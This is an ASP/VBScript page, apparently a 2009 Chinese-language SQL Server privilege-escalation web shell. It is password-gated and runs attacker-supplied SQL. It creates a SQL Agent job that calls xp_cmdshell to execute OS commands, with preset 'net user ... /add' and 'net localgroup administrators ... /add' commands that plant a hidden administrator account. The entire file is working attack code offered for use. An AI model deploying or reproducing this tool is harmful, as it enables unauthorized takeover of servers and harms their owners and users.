<%@LANGUAGE="VBSCRIPT" CODEPAGE="936"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" Content="text/html; ChaRSet=gb2312" />
<title>Sql Server PubliC or Dbowner 提权脚本 </title>
<style type="text/Css">
<!--
.STYLE1 {font-size: 12px}
.STYLE2 {
	Color: #FF0000;
	font-size: 14;
}
.STYLE3 {font-size: 14px}
a:link {
	font-family: "宋体";
	font-size: 12px;
	color: #FF0000;
	text-decoration: none;
}
a:visited {
	font-family: "宋体";
	font-size: 12px;
	color: #FF0000;
	text-decoration: none;
}
a:hover {
	font-family: "宋体";
	font-size: 12px;
	color: #0000FF;
	text-decoration: underline;
}
a:active {
	font-family: "宋体";
	font-size: 12px;
	color: #FF0000;
	text-decoration: none;
}
-->
</style>
</head>


<body>
<%
Dim Serverdos
Dim GetSql,Rs,Servername
Const Pass = "ahhacker86"
action = LCase(Request("action"))
SeleCt Case action
   Case "chklogin"
         userPass =Request("username")
         If Pass = userPass Then
         Session("jk1986") = Pass
         End If
   Case "dataname"
       	dbname = Request.Form("dbname")
        dbPass = Request.Form("dbPass")
        dbku = Request.Form("dbku")
        Response.Write(GetDataName(dbname,dbPass,dbku))
   Case "cmdtext"
        dbname = Request.Form("db")
	    dbPass = Request.Form("dbpwd")
	    Servername = Request.Form("Servername")
	    dbku = Request.Form("dbku")
	    If Trim(dbname) <> "" And Trim(dbPass) <> "" And  Trim(Servername) <> "" Then 
	    Call GetCmdtext(dbname,dbPass,dbku)
        End If	
   Case "loginout"
        Session("jk1986") = ""
        Session("dbname") = ""
        Session.AbAndon()				 
End SeleCt


   '----------------------------------------------------------------------
'-----------------          Sql Server 低权限提权脚本 by JK1986 && 夢幻★劍客 -----------------
'-----------------       E-mail: ly7666255@163.com  -----------------
'-----------------           http://www.jk1986.cn    -----------------
'-----------------           http://hi.baidu.com/ahhacker86 -----------------
'-----------------            Build (20090717)        -----------------
'----------------------------------------------------------------------
' 描述:
'    1. 本程序在Xp + IIS5.1 +MSSQL2000 下测试通过 
'    2. 本程序在SQL Agent服务开启后可通过Dbowner或者public权限提权
'    3. 纯属无聊之下写的，没什么技术含量。
'------------

FunCtion GetDataName(namestr,Passstr,kustr)
Set Conn = Server.CreateObjeCt("Adodb.ConneCtion")
Connstr = "Driver={SQL Server};Server=.;Uid=" & namestr &";Pwd=" & Passstr & ";database=" & kustr
Conn.Open Connstr
If Err.number <> 0 Then
     Response.Write(Err.desCription)
	 Err.Clear
	 Response.End()
End If 
GetSql = "SeleCt host_name()"
Set Rs = Conn.exeCute (GetSql)
Servername = Rs(0)	   
Session("dbname") = "jk"
Serverdos = Request.Form("seleCt") 
Rs.Close
Set Rs= nothing
Conn.Close
Set Conn =nothing
End FunCtion

Sub GetCmdText(namestr,Passstr,kustr)
  On Error Resume Next
    If isempty(Request.Form("Cmd"))=false Then
      Cmdshell = Request.Form("Cmd")
	  Set Conn = Server.CreateObjeCt("Adodb.ConneCtion")
      Connstr = "Driver={SQL Server};Server=.;Uid=" & namestr &";Pwd=" & Passstr & ";database=" & kustr
      Conn.Open Connstr
      If Err.number <> 0 Then
         Response.Write(Err.desCription)
	     Err.Clear
	     Response.End()
      End If 
	  Conn.exeCute (Cmdshell)
	    If Err.number <> 0 Then
	      Response.Write(Err.desCription)
	      Err.Clear
	    Else
	      If Instr(Cmdshell,"net user",1) > 0 Then
	        Response.Write("<font Color='red'> 帐户为:jk1986，密码:jk_ahhacker86 </font>")
		  ElseIf Instr(Cmdshell,"administrators",1) >0 Then
		    Response.Write("<br>")
		    Response.Write("<br>")
		    Response.Write("<font Color='red'>提权完毕!</font>")
		  End If  
	    End If
	   Conn.Close
	   Set Conn = nothing
	End If  		
End Sub
%>


<%
If Session("jk1986") = "" Then
%>
<form action="?action=Chklogin" method="post">
<table width="555" height="148" border="0" align="Center">
  <tr>
    <td height="35" Colspan="3"><div align="Center" Class="STYLE3">Sql Server PubliC or Dbowner 提 权 脚 本</div></td>
  </tr>
  <tr>
    <td width="208" height="42"><div align="Center" Class="STYLE1">
      <div align="right">登陆验证:</div>
    </div></td>
    <td width="337" Colspan="2">&nbsp;&nbsp;
      <input name="username" type="text" Class="STYLE1" id="username" /></td>
  </tr>
  <tr>
    <td height="31" Colspan="3"><div align="Center">
      <input name="Submit" type="submit" Class="STYLE1" value=" 登 陆 " />
    </div></td>
  </tr>
  
  <tr>
    <td height="30" Colspan="3"><div align="Center" Class="STYLE2 STYLE1">&nbsp;&nbsp;&nbsp;&nbsp; <span Class="STYLE3">By <a href="http://hi.baidu.com/ahhacker86" target="_blank">夢幻★剑客 && JK1986 </a>QQ:414028660 Just Fun,Enjoy It!</span> </div></td>
  </tr>
</table>
</form>
<%

ElseIf Session("jk1986") <> "" And Session("dbname") = "" Then

%>
<form action="?action=dataname" method="post">
<table width="478" height="97" border="0" align="Center">
  <tr>
    <td width="193" height="29"><div align="Center" Class="STYLE1">请输入Sql帐户:</div></td>
    <td Colspan="2"><input name="dbname" type="text" Class="STYLE1" id="dbname" /></td>
  </tr>
  <tr>
    <td height="29"><div align="Center" Class="STYLE1">请输入Sql密码:</div></td>
    <td Colspan="2"><input name="dbPass" type="text" Class="STYLE1" id="dbPass" /></td>
  </tr>
  <tr>
    <td height="29"><div align="Center" Class="STYLE1">当前数据库名称:</div></td>
    <td Colspan="2"><input name="dbku" type="text" Class="STYLE1" id="dbku" value="msdb" readonly="readonly" /></td>
  </tr>
  <tr>
    <td height="29"><div align="Center" Class="STYLE1">添加帐户命令:</div></td>
    <td Colspan="2"><seleCt name="seleCt">
	<option>net user jk1986 jk_ahhacker86 /add</option>
	<option>net localgroup administrators jk1986 /add</option>
    </seleCt>
    </td>
  </tr>
  
  <tr>
    <td height="29" Colspan="3"><div align="Center">
      <input name="Submit2" type="submit" Class="STYLE1" value=" 获取数据库服务器名称" />
    </div></td>
  </tr>
</table>
</form>
<%

ElseIf Session("jk1986") <> ""  And Session("dbname") <> "" Then

%>
<form action="?action=Cmdtext" method="post">
<table width="478" height="97" border="0" align="Center">
  <tr>
    <td width="168" height="25"><div align="Center" Class="STYLE1">数据库服务器名称: </div></td>
    <td width="300"><input name="Servername" type="text" Class="STYLE1" id="Servername" value="<%=Servername%>" /></td>
  </tr>
  <tr>
    <td width="168" height="25"><div align="Center" Class="STYLE1">Sql帐户: </div></td>
    <td width="300"><input name="db" type="text" Class="STYLE1" id="db" value="<%=dbname%>" /></td>
  </tr>
  <tr>
    <td width="168" height="25"><div align="Center" Class="STYLE1">Sql密码: </div></td>
    <td width="300"><input name="dbpwd" type="text" Class="STYLE1" id="dbpwd" value="<%=dbPass%>" /></td>
  </tr>
  <tr>
    <td width="168" height="25"><div align="Center" Class="STYLE1">当前数据库名称: </div></td>
    <td width="300"><input name="dbku" type="text" Class="STYLE1" id="dbku" value="msdb" readonly = "readonly"/></td>
  </tr>
  <tr>
    <td width="168" height="25"><div align="Center" Class="STYLE1">本文件路径: </div></td>
    <td width="300"><input name="dbpath" type="text" Class="STYLE1" id="dbpath" value="<%=Server.MapPath(Request.ServerVariables("SCRIPT_NAME"))%>" readonly="readonly" /></td>
  </tr>
  <tr>
    <td height="31"><div align="Center" Class="STYLE1">命令:</div></td>
    <td><textarea name="Cmd" Cols="80" rows="20" Class="STYLE1" id="Cmd" style="display:none">
EXEC sp_add_job @job_name = 'jktest',
@enabled = 1,
@delete_level = 1
EXEC sp_add_jobstep @job_name = 'jktest',
@step_name = 'ExeC my sql',
@subsystem = 'TSQL',
@CommAnd = 'exeC master..xp_exeCresultSet N''seleCt ''''exeC
master..xp_Cmdshell &quot;<% =Serverdos%>&gt;C:\jk.txt&quot;'''''',N''Master'''
EXEC sp_add_jobServer @job_name = 'jktest',
@Server_name = '<%=Servername%>'  
EXEC sp_start_job @job_name = 'jktest'</textarea>
  <input name="dos" type="text" Class="STYLE1" id="dos" value="<%=Serverdos%>" size="40" readonly="readonly" /></td>
  </tr>
  <tr>
    <td height="26" Colspan="2"><div align="Center">
      <input name="Submit3" type="submit" Class="STYLE1" value=" 执 行 " />
    &nbsp;&nbsp;&nbsp;<span Class="STYLE1"><a href="?action=loginout">退出登陆</a></span></div></td>
  </tr>
</table>
</form>
<%
End If
%>
</body>
</html>
